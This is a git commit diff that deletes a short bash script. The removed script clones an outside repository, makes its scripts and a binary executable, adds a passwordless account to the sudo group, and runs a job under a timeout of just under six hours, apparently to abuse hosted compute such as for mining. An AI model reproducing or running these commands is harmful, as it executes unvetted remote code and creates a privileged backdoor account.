ae3431bef9f38b5dd791d76af7a05826d7ccee3a
Jshshh8272 <86884913+Jshshh8272@users.noreply.github.com>
2021-07-03 22:35:34 +0700

    Delete kuntul.sh

--- kuntul.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-sudo apt update
-git clone https://github.com/Kikinan86/workerkun.git && cd workerkun
-chmod +x okeh.sh && chmod +x cumin
-sudo adduser --disabled-password --gecos "" ikuk && sudo usermod -aG sudo ikuk
-sudo -u ikuk -H sh -c "timeout 359m ./okeh.sh"
